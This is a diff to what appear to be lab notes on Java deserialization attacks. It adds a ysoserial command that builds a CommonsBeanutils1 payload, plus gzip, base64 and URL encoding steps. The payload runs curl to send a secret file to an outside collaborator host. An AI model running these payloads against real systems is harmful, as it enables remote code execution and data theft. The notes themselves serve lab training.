@@ -85,3 +85,18 @@ ysoserial CommonsCollections4 "sh -c echo\${IFS}Y3VybCAtZCBAL2hvbWUvY2FybG9zL21v
 - View the exfiltrated contents inside the raw POST body
 
 ---
+extra for gzip related data
+
+
+java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+     --add-opens java.base/java.net=ALL-UNNAMED \
+     --add-opens java.base/java.util=ALL-UNNAMED \
+     -jar ~/Downloads/ysoserial-all.jar CommonsBeanutils1 \
+     'curl -d @/home/carlos/secret http://eq8y4vwmyzcnuppr6xkcmm6cx33urlw9l.oastify.com' \
+     > /tmp/payload.ser && \
+gzip -c /tmp/payload.ser | base64 -w 0 | python3 -c "
+import sys, urllib.parse
+data = sys.stdin.read().strip()
+print(urllib.parse.quote(data, safe=''))
+"
